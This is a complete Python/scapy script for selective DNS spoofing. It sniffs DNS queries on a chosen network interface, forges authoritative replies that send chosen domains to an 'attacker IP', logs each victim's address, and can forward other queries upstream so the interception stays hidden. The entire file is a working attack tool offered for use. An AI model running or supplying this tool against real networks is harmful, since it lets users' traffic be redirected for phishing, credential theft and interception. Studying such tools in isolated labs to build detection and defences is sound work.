#!/usr/bin/env python3

import argparse
import fnmatch
import ipaddress
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import sys

def load_targets(path):
    targets = []
    with open(path) as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith('#'):
                continue
            targets.append(s.lower())
    return targets

def matches_targets(qname, targets):
    q = qname.rstrip('.').lower()
    for t in targets:
        if t.startswith('*.'):
            if fnmatch.fnmatch(q, t.replace('*.', '*')):
                return True
        elif q == t:
            return True
    return False

def craft_response(pkt, attacker_ip):
    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=53)
    dns_q = pkt[DNSQR]
    
    ans = DNSRR(rrname=dns_q.qname, type='A', rclass='IN', rdata=attacker_ip, ttl=300)
    
    dns = DNS(
        id=pkt[DNS].id,
        qr=1,
        opcode=0,
        aa=1,
        tc=0,
        rd=pkt[DNS].rd,
        ra=1,
        z=0,
        rcode=0,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        qd=dns_q,
        an=ans
    )
    
    resp = ip/udp/dns
    return resp

def forward_query(pkt, upstream):
    q = pkt[DNSQR].qname
    dns_req = IP(dst=upstream)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=q))
    resp = sr1(dns_req, timeout=2, verbose=0)
    return resp

def handle_packet(pkt, targets, attacker_ip, upstream, forward_non_targets):
    if DNS in pkt and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname.decode() if isinstance(pkt[DNSQR].qname, bytes) else pkt[DNSQR].qname
        qname_clean = qname.rstrip('.')
        if matches_targets(qname_clean, targets):
            resp = craft_response(pkt, attacker_ip)
            send(resp, verbose=0)
            print(f"[spoof] {qname_clean} -> {attacker_ip} (victim {pkt[IP].src})")
        else:
            if forward_non_targets and upstream:
                resp = forward_query(pkt, upstream)
                if resp:
                    resp[IP].dst = pkt[IP].src
                    resp[IP].src = pkt[IP].dst
                    resp[UDP].dport = pkt[UDP].sport
                    resp[UDP].sport = 53
                    send(resp, verbose=0)
                    print(f"[forward] {qname_clean} forwarded to {upstream}")
                else:
                    print(f"[forward] no response for {qname_clean}")
            else:
                print(f"[ignore] {qname_clean} (not in targets)")

def main():
    parser = argparse.ArgumentParser(description="Selective DNS spoofer")
    parser.add_argument('--iface', required=True, help='interface to listen on (e.g. v-att)')
    parser.add_argument('--targets', required=True, help='file with target domains (one per line)')
    parser.add_argument('--attacker-ip', required=True, help='IP to respond with (attacker IP)')
    parser.add_argument('--upstream', default=None, help='upstream resolver to forward non-targets (optional)')
    parser.add_argument('--forward-non-targets', action='store_true', help='forward non-target queries to upstream')
    args = parser.parse_args()

    try:
        ipaddress.ip_address(args.attacker_ip)
    except Exception:
        print("Invalid attacker IP")
        sys.exit(1)

    targets = load_targets(args.targets)
    print(f"[info] Loaded {len(targets)} targets from {args.targets}")
    print(f"[info] Listening on {args.iface}, attacker IP {args.attacker_ip}")
    if args.forward_non_targets:
        print(f"[info] Forwarding non-targets to {args.upstream}")

    sniff(iface=args.iface, filter="udp port 53", store=0,
          prn=lambda p: handle_packet(p, targets, args.attacker_ip, args.upstream, args.forward_non_targets))

if __name__ == '__main__':
    main()
